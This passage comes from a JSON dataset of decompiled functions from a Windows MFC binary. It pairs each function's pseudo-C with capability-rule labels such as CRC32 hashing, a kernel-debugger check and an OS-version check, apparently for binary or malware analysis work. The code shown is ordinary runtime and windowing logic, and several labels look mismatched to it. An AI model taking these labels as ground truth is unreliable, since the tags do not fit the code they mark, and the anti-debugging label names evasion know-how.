= *0x450be0 | 0x100;\n    if (*0x450be4 == 0) {\n        *0x450be4 = arg_8h_00;\n    }\ncode_r0x0042465a:\n    fcn.004192ca();\n    return;\n}\n",
        "token_count": 1085
    },
    "00424e2b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint fcn.00424e2b(uint32_t param_1)\n\n{\n    uint *puVar1;\n    \n    if ((param_1 < *0x450e88) &&\n       (puVar1 = *((param_1 >> 5) * 4 + 0x450ea0) + (param_1 & 0x1f) * 0x24,  (*(puVar1 + 1) & 1) != 0)) {\n        return *puVar1;\n    }\n    puVar1 = fcn.0041a92a();\n    *puVar1 = 9;\n    puVar1 = fcn.0041a933();\n    *puVar1 = 0;\n    return 0xffffffff;\n}\n",
        "token_count": 163
    },
    "00424fb1": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00424fb1(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint *puVar2;\n    int32_t unaff_EBP;\n    int32_t iVar3;\n    ulong uVar4;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00419d14(0x443b18, 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 < *0x450e88) {\n        piVar1 = (arg_8h_00 >> 5) * 4 + 0x450ea0;\n        iVar3 = (arg_8h_00 & 0x1f) * 0x24;\n        if ((*(*piVar1 + 4 + iVar3) & 1) != 0) {\n            fcn.00424e6c(arg_8h_00);\n            *(unaff_EBP + -4) = 0;\n            if ((*(*piVar1 + 4 + iVar3) & 1) == 0) {\n                puVar2 = fcn.0041a92a();\n                *puVar2 = 9;\n                puVar2 = fcn.0041a933();\n                *puVar2 = 0;\n                *(unaff_EBP + -0x20) = 0xffffffff;\n                *(unaff_EBP + -0x1c) = 0xffffffff;\n            }\n            else {\n                uVar4 = fcn.00424f2e(arg_8h_00, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), *(unaff_EBP + 0x14));\n                *(unaff_EBP + -0x20) = uVar4;\n                *(unaff_EBP + -0x1c) = uVar4 >> 0x20;\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.00425049();\n            goto code_r0x00425069;\n        }\n    }\n    puVar2 = fcn.0041a92a();\n    *puVar2 = 9;\n    puVar2 = fcn.0041a933();\n    *puVar2 = 0;\ncode_r0x00425069:\n    fcn.00419d4f();\n    return;\n}\n",
        "token_count": 586
    },
    "00425cfb": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00425cfb(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint uVar2;\n    uint *puVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00419d14(0x443b68, 0xc);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 < *0x450e88) {\n        piVar1 = (arg_8h_00 >> 5) * 4 + 0x450ea0;\n        iVar4 = (arg_8h_00 & 0x1f) * 0x24;\n        if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n            fcn.00424e6c(arg_8h_00);\n            *(unaff_EBP + -4) = 0;\n            if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                puVar3 = fcn.0041a92a();\n                *puVar3 = 9;\n                puVar3 = fcn.0041a933();\n                *puVar3 = 0;\n                *(unaff_EBP + -0x1c) = 0xffffffff;\n            }\n            else {\n                uVar2 = fcn.00425b20(arg_8h_00, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                *(unaff_EBP + -0x1c) = uVar2;\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.00425d82();\n            goto code_r0x00425da0;\n        }\n    }\n    puVar3 = fcn.0041a92a();\n    *puVar3 = 9;\n    puVar3 = fcn.0041a933();\n    *puVar3 = 0;\ncode_r0x00425da0:\n    fcn.00419d4f();\n    return;\n}\n",
        "token_count": 524
    },
    "00426090": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00426090(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint uVar2;\n    uint *puVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00419d14(0x443b78, 0xc);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 < *0x450e88) {\n        piVar1 = (arg_8h_00 >> 5) * 4 + 0x450ea0;\n        iVar4 = (arg_8h_00 & 0x1f) * 0x24;\n        if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n            fcn.00424e6c(arg_8h_00);\n            *(unaff_EBP + -4) = 0;\n            if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                puVar3 = fcn.0041a92a();\n                *puVar3 = 9;\n                *(unaff_EBP + -0x1c) = 0xffffffff;\n            }\n            else {\n                uVar2 = fcn.0042600d(arg_8h_00);\n                *(unaff_EBP + -0x1c) = uVar2;\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.00426107();\n            goto code_r0x00426125;\n        }\n    }\n    puVar3 = fcn.0041a92a();\n    *puVar3 = 9;\n    puVar3 = fcn.0041a933();\n    *puVar3 = 0;\ncode_r0x00426125:\n    fcn.00419d4f();\n    return;\n}\n",
        "token_count": 467
    },
    "00427b8e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00427b8e(uint param_1)\n\n{\n    uint32_t unaff_ESI;\n    \n    fcn.00401e00(1, 0);\n    if ((unaff_ESI & 1) != 0) {\n        fcn.0042f834(param_1);\n    }\n    return param_1;\n}\n",
        "token_count": 79
    },
    "0042971a": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint64_t __cdecl fcn.0042971a(char **arg_8h)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    uint64_t uVar3;\n    char **ppcVar4;\n    char *arg_ch;\n    uint *puVar5;\n    char *pcVar6;\n    char *pcVar7;\n    char *pcVar8;\n    char *pcVar9;\n    int32_t arg_10h;\n    int32_t iVar10;\n    int64_t iVar11;\n    int64_t iVar12;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    char *var_4h;\n    \n    ppcVar4 = arg_8h;\n    pcVar7 = arg_8h[4];\n    if (arg_8h[1] < 0) {\n        arg_8h[1] = NULL;\n    }\n    iVar11 = fcn.00424fb1(pcVar7, 0, 0, 1);\n    arg_10h = iVar11 >> 0x20;\n    arg_ch = iVar11;\n    if ((iVar11 < 0x100000000) && (iVar11 < 0)) {\ncode_r0x004297d7:\n        uVar3 = 0xffffffffffffffff;\n    }\n    else {\n        if ((*(arg_8h + 3) & 0x108) == 0) {\n            return iVar11 - arg_8h[1];\n        }\n        pcVar6 = *arg_8h;\n        pcVar9 = arg_8h[2];\n        var_4h = pcVar6 + -pcVar9;\n        if ((arg_8h[3] & 3) == 0) {\n            if (-1 < arg_8h[3]) {\n                puVar5 = fcn.0041a92a();\n                *puVar5 = 0x16;\n                goto code_r0x004297d7;\n            }\n        }\n        else if (((*(*((pcVar7 >> 5) * 4 + 0x450ea0) + 4 + (pcVar7 & 0x1f) * 0x24) & 0x80) != 0) &&\n                (pcVar8 = pcVar9,  pcVar9 < pcVar6)) {\n            do {\n                if (*pcVar8 == '\\n') {\n                    var_4h = var_4h + 1;\n                }\n                pcVar8 = pcVar8 + 1;\n            } while (pcVar8 < *arg_8h);\n        }\n        if (iVar11 == 0) {\n            uVar3 = ZEXT48(var_4h);\n        }\n        else {\n            if (((*(arg_8h + 3) & 1) != 0) && (arg_8h[1] != NULL)) {\n                pcVar6 = arg_8h[1] + (pcVar6 - pcVar9);\n                piVar1 = (pcVar7 >> 5) * 4 + 0x450ea0;\n                iVar10 = (pcVar7 & 0x1f) * 0x24;\n                if ((*(iVar10 + 4 + *piVar1) & 0x80) != 0) {\n                    iVar12 = fcn.00424fb1(pcVar7, 0, 0, 2);\n                    if (iVar12 == iVar11) {\n                        pcVar7 = arg_8h[2];\n                        pcVar9 = pcVar6 + pcVar7;\n                        arg_8h = pcVar6;\n                        for (; pcVar7 < pcVar9; pcVar7 = pcVar7 + 1) {\n                            if (*pcVar7 == '\\n') {\n                                arg_8h = arg_8h + 1;\n                            }\n                        }\n                        uVar2 = *(ppcVar4 + 0xd) & 0x20;\n                    }\n                    else {\n                        fcn.00424fb1(pcVar7, arg_ch, arg_10h, 0);\n                        pcVar7 = 0x200;\n                        if (((0x200 < pcVar6) || ((arg_8h[3] & 8) == 0)) || ((arg_8h[3] & 0x400) != 0)) {\n                            pcVar7 = arg_8h[6];\n                        }\n                        uVar2 = *(iVar10 + 4 + *piVar1) & 4;\n                        arg_8h = pcVar7;\n                    }\n                    pcVar6 = arg_8h;\n                    if (uVar2 != 0) {\n                        pcVar6 = arg_8h + 1;\n                    }\n                }\n                arg_8h = pcVar6;\n                iVar11 = CONCAT44(arg_10h - (arg_ch < arg_8h), arg_ch + -arg_8h);\n            }\n            uVar3 = iVar11 - 8;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 1107
    },
    "0042c5a5": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.0042c5a5(int32_t *param_1, uint8_t param_2)\n\n{\n    bool bVar1;\n    bool bVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t unaff_EBX;\n    uint8_t unaff_retaddr;\n    \n    bVar1 = true;\n    bVar2 = false;\n    if (((param_2 & 4) == 0) || (uVar4 = fcn.0042ebfd(),  (uVar4 & 0x10000000) != 0)) {\n        bVar1 = false;\n    }\n    iVar5 = (*_sym.imp.USER32.dll_GetParent)(param_1[7]);\n    param_1[0xe] = param_1[0xe] | 0x18;\n    iVar6 = fcn.0042fa7e();\n    pcVar3 = _sym.imp.USER32.dll_UpdateWindow;\ncode_r0x0042c664:\n    while ((!bVar2 || (iVar7 = (*_sym.imp.USER32.dll_PeekMessageA)(iVar6, 0, 0, 0, 0),  iVar7 != 0))) {\n        do {\n            iVar7 = fcn.0042fd82();\n            if (iVar7 == 0) {\n                fcn.0043b077(0);\n                return -1;\n            }\n            if ((bVar1) && ((*(iVar6 + 4) == 0x118 || (*(iVar6 + 4) == 0x104)))) {\n                fcn.0042ecd5(1);\n                (*pcVar3)(param_1[7]);\n                bVar1 = false;\n            }\n            iVar7 = (**(*param_1 + 0x80))();\n            if (iVar7 == 0) {\n                param_1[0xe] = param_1[0xe] & 0xffffffe7;\n                return param_1[0x10];\n            }\n            iVar7 = fcn.0042fcee(iVar6);\n            if (iVar7 != 0) {\n                bVar2 = true;\n                unaff_EBX = 0;\n            }\n            iVar7 = (*_sym.imp.USER32.dll_PeekMessageA)(iVar6, 0, 0, 0, 0);\n        } while (iVar7 != 0);\n    }\n    if (bVar1) {\n        fcn.0042ecd5(1);\n        (*pcVar3)(param_1[7]);\n        bVar1 = false;\n    }\n    if ((((unaff_retaddr & 1) == 0) && (iVar5 != 0)) && (unaff_EBX == 0)) {\n        (*_sym.imp.USER32.dll_SendMessageA)(iVar5, 0x121, 0, param_1[7]);\n    }\n    if ((unaff_retaddr & 2) == 0) goto code_r0x0042c645;\n    goto code_r0x0042c660;\ncode_r0x0042c645:\n    iVar7 = (*_sym.imp.USER32.dll_SendMessageA)(param_1[7], 0x36a, 0, unaff_EBX);\n    unaff_EBX = unaff_EBX + 1;\n    if (iVar7 == 0) {\ncode_r0x0042c660:\n        bVar2 = false;\n    }\n    goto code_r0x0042c664;\n}\n",
        "token_count": 791
    },
    "0042c75a": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nbool __cdecl fcn.0042c75a(uint32_t arg_8h)\n\n{\n    uint noname_8;\n    uint noname_11;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint32_t uVar3;\n    uint unaff_EDI;\n    bool bVar4;\n    uint *noname_0;\n    uint32_t var_34h;\n    uint var_30h;\n    uint in_stack_ffffffd0;\n    uint in_stack_ffffffd4;\n    uint var_24h;\n    uint in_stack_ffffffdc;\n    uint var_1ch;\n    uint var_18h;\n    uint in_stack_ffffffe8;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00438818();\n    arg_8h = arg_8h & ~*(var_4h + 0x18);\n    if (arg_8h == 0) {\n        bVar4 = true;\n    }\n    else {\n        uVar3 = 0;\n        fcn.004192e0(&var_34h, 0, 0x28);\n        var_30h = _sym.imp.USER32.dll_DefWindowProcA;\n        iVar1 = fcn.00438818();\n        noname_11 = *0x4504a8;\n        noname_8 = *(iVar1 + 8);\n        noname_0 = 0x8;\n        var_ch = 8;\n        if ((arg_8h & 1) != 0) {\n            noname_0 = &var_34h;\n            var_34h = 0xb;\n            iVar1 = fcn.0042b61a(noname_0, unaff_EDI, unaff_ESI, unaff_EBX, 0xb, var_30h, in_stack_ffffffd0, \n                                 in_stack_ffffffd4, noname_8, in_stack_ffffffdc, *0x4504a8, var_18h, in_stack_ffffffe8, \n                                 \"AfxWnd70s\", 8, var_8h, var_4h, unaff_EBP);\n            if (iVar1 != 0) {\n                uVar3 = 1;\n            }\n        }\n        if ((arg_8h & 0x20) != 0) {\n            var_34h = var_34h | 0x8b;\n            iVar1 = fcn.0042b61a(&var_34h, noname_0, unaff_EDI, unaff_ESI, unaff_EBX, var_34h, var_30h, \n                                 in_stack_ffffffd0, in_stack_ffffffd4, noname_8, in_stack_ffffffdc, noname_11, var_18h, \n                                 in_stack_ffffffe8, \"AfxOleControl70s\", var_ch, var_8h, var_4h);\n            if (iVar1 != 0) {\n                uVar3 = uVar3 | 0x20;\n            }\n        }\n        if ((arg_8h & 2) != 0) {\n            var_34h = 0;\n            iVar1 = fcn.0042b61a(&var_34h, noname_0, unaff_EDI, unaff_ESI, unaff_EBX, 0, var_30h, in_stack_ffffffd0, \n                                 in_stack_ffffffd4, noname_8, in_stack_ffffffdc, noname_11, 0x10, in_stack_ffffffe8, \n                                 \"AfxControlBar70s\", var_ch, var_8h, var_4h);\n            if (iVar1 != 0) {\n                uVar3 = uVar3 | 2;\n            }\n        }\n        if ((arg_8h & 4) != 0) {\n            var_34h = 8;\n            iVar1 = fcn.0042c719(&var_34h, \"AfxMDIFrame70s\", 0x7a01);\n            if (iVar1 != 0) {\n                uVar3 = uVar3 | 4;\n            }\n        }\n        if ((arg_8h & 8) != 0) {\n            var_34h = 0xb;\n            iVar1 = fcn.0042c719(&var_34h, \"AfxFrameOrView70s\", 0x7a02);\n            if (iVar1 != 0) {\n                uVar3 = uVar3 | 8;\n            }\n        }\n        if ((arg_8h & 0x10) != 0) {\n            var_8h = 0xff;\n            uVar2 = fcn.0042bf6d(&var_ch, 0x3fc0);\n            uVar3 = uVar3 | uVar2;\n            arg_8h = arg_8h & 0xffffc03f;\n        }\n        if ((arg_8h & 0x40) != 0) {\n            var_8h = 0x10;\n            uVar2 = fcn.0042bf6d(&var_ch, 0x40);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x80) != 0) {\n            var_8h = 2;\n            uVar2 = fcn.0042bf6d(&var_ch, 0x80);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x100) != 0) {\n            var_8h = 8;\n            uVar2 = fcn.0042bf6d(&var_ch, 0x100);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x200) != 0) {\n            var_8h = 0x20;\n            uVar2 = fcn.0042bf6d(&var_ch, 0x200);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x400) != 0) {\n            var_8h = 1;\n            uVar2 = fcn.0042bf6d(&var_ch, 0x400);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x800) != 0) {\n            var_8h = 0x40;\n            uVar2 = fcn.0042bf6d(&var_ch, 0x800);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x1000) != 0) {\n            var_8h = 4;\n            uVar2 = fcn.0042bf6d(&var_ch, 0x1000);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x2000) != 0) {\n            var_8h = 0x80;\n            uVar2 = fcn.0042bf6d(&var_ch, 0x2000);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x4000) != 0) {\n            var_8h = 0x800;\n            uVar2 = fcn.0042bf6d(&var_ch, 0x4000);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x8000) != 0) {\n            var_8h = 0x400;\n            uVar2 = fcn.0042bf6d(&var_ch, 0x8000);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x10000) != 0) {\n            var_8h = 0x200;\n            uVar2 = fcn.0042bf6d(&var_ch, 0x10000);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x20000) != 0) {\n            var_8h = 0x100;\n            uVar2 = fcn.0042bf6d(&var_ch, 0x20000);\n            uVar3 = uVar3 | uVar2;\n        }\n        if ((arg_8h & 0x40000) != 0) {\n            var_8h = 0x8000;\n            uVar2 = fcn.0042bf6d(&var_ch, 0x40000);\n            uVar3 = uVar3 | uVar2;\n        }\n        *(var_4h + 0x18) = *(var_4h + 0x18) | uVar3;\n        if ((*(var_4h + 0x18) & 0x3fc0) == 0x3fc0) {\n            *(var_4h + 0x18) = *(var_4h + 0x18) | 0x10;\n            uVar3 = uVar3 | 0x10;\n        }\n        bVar4 = (uVar3 & arg_8h) == arg_8h;\n    }\n    return bVar4;\n}\n",
        "token_count": 2279
    },
    "0042ebca": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0042ebca(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    if ((*(param_1 + 0x39) & 1) == 0) {\n        (*_sym.imp.USER32.dll_IsDialogMessageA)(*(param_1 + 0x1c), param_2);\n    }\n    else {\n        iVar1 = fcn.00438818();\n        (**(**(iVar1 + 0x1038) + 0x24))(param_1, param_2);\n    }\n    return;\n}\n",
        "token_count": 132
    },
    "0043310a": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043310a(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = *(param_1 + 0x28);\n    if ((*(param_1 + 0x18) & 1) == 0) {\n        piVar1 = param_1 + 0x30;\n        iVar2 = *piVar1;\n        if (*(param_1 + 8) == 0) {\n            if (iVar3 != iVar2) {\n                (**(**(param_1 + 0x24) + 0x38))(iVar2, iVar3 - iVar2);\n            }\n        }\n        else {\n            if (iVar3 != iVar2) {\n                (**(**(param_1 + 0x24) + 0x50))(2, iVar3 - iVar2, 0, 0);\n            }\n            (**(**(param_1 + 0x24) + 0x50))(1, *(param_1 + 0x20), piVar1, param_1 + 0x2c);\n        }\n        iVar3 = *piVar1;\n    }\n    else {\n        if (*(param_1 + 0x2c) != iVar3) {\n            iVar3 = iVar3 - *(param_1 + 0x2c);\n            (**(**(param_1 + 0x24) + 0x28))(iVar3, iVar3 >> 0x1f, 1);\n        }\n        iVar3 = *(param_1 + 0x2c);\n    }\n    *(param_1 + 0x28) = iVar3;\n    return;\n}\n",
        "token_count": 376
    },
    "004333c8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint * __cdecl fcn.004333c8(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint *extraout_ECX;\n    int32_t unaff_EBP;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00419340();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    fcn.004020b0();\n    piVar1 = *(unaff_EBP + 8);\n    *(unaff_EBP + -4) = 0;\n    if (piVar1 == NULL) {\n        fcn.00429be4();\n    }\n    uVar2 = (**(*piVar1 + 0x18))(unaff_EBP + 8);\n    *(unaff_EBP + -4) = 1;\n    fcn.0040fa3c(uVar2);\n    *(unaff_EBP + -4) = 0;\n    fcn.004014f0();\n    uVar2 = *(unaff_EBP + 0xc);\n    extraout_ECX[4] = 0xffffffff;\n    extraout_ECX[6] = uVar2;\n    extraout_ECX[1] = 1;\n    extraout_ECX[7] = 1;\n    extraout_ECX[9] = piVar1;\n    extraout_ECX[0x10] = (-((~uVar2 & 1) != 0) & 0xffffffd0) + 0x40;\n    uVar2 = *(unaff_EBP + 0x14);\n    extraout_ECX[0xf] = 0;\n    extraout_ECX[0xe] = 0;\n    *extraout_ECX = 0;\n    extraout_ECX[0x11] = 0x89;\n    extraout_ECX[0xc] = uVar2;\n    extraout_ECX[2] = 0;\n    uVar3 = (**(*piVar1 + 0x50))(3, 0, 0, 0);\n    iVar5 = *(unaff_EBP + 0x10);\n    extraout_ECX[3] = uVar3 & 2;\n    if (iVar5 < 0x80) {\n        extraout_ECX[8] = 0x80;\n        extraout_ECX[0xc] = 0;\n    }\n    else {\n        extraout_ECX[8] = iVar5;\n    }\n    iVar5 = extraout_ECX[8];\n    if (extraout_ECX[0xc] == 0) {\n        uVar3 = (**(*extraout_ECX[9] + 0x50))(3, 0, 0, 0);\n        extraout_ECX[2] = uVar3 & 1;\n        if ((uVar3 & 1) == 0) {\n            uVar2 = fcn.0042f804(extraout_ECX[8]);\n            extraout_ECX[0xc] = uVar2;\n            extraout_ECX[7] = 0;\n        }\n        else {\n            iVar5 = 0;\n        }\n    }\n    iVar5 = extraout_ECX[0xc] + iVar5;\n    extraout_ECX[0xb] = iVar5;\n    iVar4 = extraout_ECX[0xc];\n    if ((*(extraout_ECX + 6) & 1) != 0) {\n        iVar4 = iVar5;\n    }\n    uVar2 = *(unaff_EBP + -0xc);\n    extraout_ECX[10] = iVar4;\n    *in_FS_OFFSET = uVar2;\n    return extraout_ECX;\n}\n",
        "token_count": 912
    },
    "00434b7c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00434b7c(int32_t param_1, uint32_t param_2)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint uVar7;\n    \n    uVar3 = fcn.0042ebfd();\n    iVar4 = param_1;\n    if ((uVar3 & 0x40000000) == 0) {\n        iVar4 = fcn.0042d4a4();\n    }\n    pcVar2 = _sym.imp.USER32.dll_SendMessageA;\n    if ((param_2 & 0xc) != 0) {\n        iVar5 = fcn.0042ecf6();\n        if ((((~(param_2 >> 3) & 1) == 0) || (iVar5 == 0)) || (iVar4 == param_1)) {\n            (*pcVar2)(*(iVar4 + 0x1c), 0x86, 0, 0);\n        }\n        else {\n            *(param_1 + 0x39) = *(param_1 + 0x39) | 2;\n            (*pcVar2)(*(iVar4 + 0x1c), 0x86, 1, 0);\n            *(param_1 + 0x39) = *(param_1 + 0x39) & 0xfd;\n        }\n    }\n    uVar7 = 5;\n    iVar5 = (*_sym.imp.USER32.dll_GetDesktopWindow)(5);\n    pcVar1 = _sym.imp.USER32.dll_GetWindow;\n    while (iVar5 = (*pcVar1)(iVar5, uVar7),  iVar5 != 0) {\n        iVar6 = fcn.004345e7(*(iVar4 + 0x1c), iVar5);\n        if (iVar6 != 0) {\n            (*pcVar2)(iVar5, 0x36d, param_2, 0);\n        }\n        uVar7 = 2;\n    }\n    return;\n}\n",
        "token_count": 469
    },
    "004389a9": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004389a9(int32_t param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint8_t *puVar6;\n    int32_t iVar7;\n    uint uStack48;\n    uchar *puStack44;\n    int32_t iStack40;\n    uint uStack36;\n    int32_t iStack32;\n    int32_t iStack28;\n    uint hMem;\n    uint lpCriticalSection;\n    \n    iVar4 = param_1 + 0x1c;\n    iStack32 = 0x4389c0;\n    iStack28 = iVar4;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n    iVar2 = *(param_1 + 4);\n    iVar7 = *(param_1 + 8);\n    if ((iVar2 <= iVar7) || ((*(*(param_1 + 0x10) + iVar7 * 8) & 1) != 0)) {\n        iVar7 = 1;\n        if (1 < iVar2) {\n            puVar6 = *(param_1 + 0x10);\n            do {\n                puVar6 = puVar6 + 8;\n                if ((*puVar6 & 1) == 0) break;\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < iVar2);\n            if (iVar7 < iVar2) goto code_r0x00438a8b;\n        }\n        iVar2 = iVar2 + 0x20;\n        iStack32 = *(param_1 + 0x10);\n        if (iStack32 == 0) {\n            iStack32 = iVar2 * 8;\n            uStack36 = 2;\n            iStack40 = 0x438a11;\n            iStack40 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)();\n        }\n        else {\n            uStack36 = 0x438a1a;\n            uStack48 = (*_sym.imp.KERNEL32.dll_GlobalHandle)();\n            iStack40 = 0x438a24;\n            uStack36 = uStack48;\n            (*_sym.imp.KERNEL32.dll_GlobalUnlock)();\n            iStack40 = 0x2002;\n            puStack44 = iVar2 * 8;\n            iStack40 = (*_sym.imp.KERNEL32.dll_GlobalReAlloc)();\n        }\n        if (iStack40 == 0) {\n            iStack40 = *(param_1 + 0x10);\n            if (iStack40 != 0) {\n                puStack44 = 0x438a4a;\n                puStack44 = (*_sym.imp.KERNEL32.dll_GlobalHandle)();\n                uStack48 = 0x438a51;\n                (*_sym.imp.KERNEL32.dll_GlobalLock)();\n            }\n            puStack44 = 0x438a5a;\n            iStack40 = iVar4;\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)();\n            uStack48 = 0x450280;\n            puStack44 = &stack0xfffffffc;\n            fcn.004187b8(&stack0xffffffd0, 0x447974);\n            pcVar3 = swi(3);\n            iVar4 = (*pcVar3)();\n            return iVar4;\n        }\n        puStack44 = 0x438a66;\n        iVar5 = (*_sym.imp.KERNEL32.dll_GlobalLock)();\n        iStack32 = (iVar2 - *(param_1 + 4)) * 8;\n        iStack40 = iVar5 + *(param_1 + 4) * 8;\n        uStack36 = 0;\n        puStack44 = 0x438a7f;\n        fcn.004192e0();\n        *(param_1 + 4) = iVar2;\n        *(param_1 + 0x10) = iVar5;\n    }\ncode_r0x00438a8b:\n    if (*(param_1 + 0xc) <= iVar7) {\n        *(param_1 + 0xc) = iVar7 + 1;\n    }\n    puVar1 = *(param_1 + 0x10) + iVar7 * 8;\n    *puVar1 = *puVar1 | 1;\n    *(param_1 + 8) = iVar7 + 1;\n    uStack36 = 0x438aae;\n    iStack32 = iVar4;\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)();\n    return iVar7;\n}\n",
        "token_count": 992
    },
    "0041a2eb": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
